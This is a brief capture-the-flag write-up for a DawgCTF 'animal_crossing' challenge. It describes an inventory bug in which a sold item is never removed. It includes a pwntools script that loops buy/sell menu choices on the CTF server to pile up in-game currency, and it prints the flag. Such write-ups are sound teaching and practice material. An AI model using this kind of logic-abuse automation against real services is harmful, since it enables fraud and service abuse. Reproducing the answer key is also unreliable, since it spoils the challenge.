Testing the program from shell I noticed that buying a flimsy net and selling it was not removed from the inventory.
So we can earn infinite bells and buy the flag. 
(The official solution use tarantulas insted of flimsy net -> less cycles)

Exploit:
```python
from pwn import *

p = remote('ctf.umbccd.io', 4400)
#p = process('./animal_crossing')

print(p.recvuntil('Choice: ').decode())
p.sendline('2')
print(p.recvuntil('420000 bells\n').decode())
p.sendline('1')

for i in range (1050):
    print(p.recvuntil('Choice: ').decode())
    p.sendline('1')
    print(p.recvuntil('400 bells\n').decode())
    p.sendline('5')
    print(f'ciclo {i} finito')

print(p.recvuntil('Choice: ').decode())
p.sendline('1')
print(p.recvuntil('400 bells\n').decode())
p.sendline('1')
print(p.recvuntil('Choice: ').decode())
p.sendline('2')
print(p.recvuntil('420000 bells\n').decode())
p.sendline('6')
print(p.recvuntil('Choice: ').decode())
p.sendline('1')
p.interactive()
```

# FLAG
`DawgCTF{1nf1n1t3_t@rantul@$}`
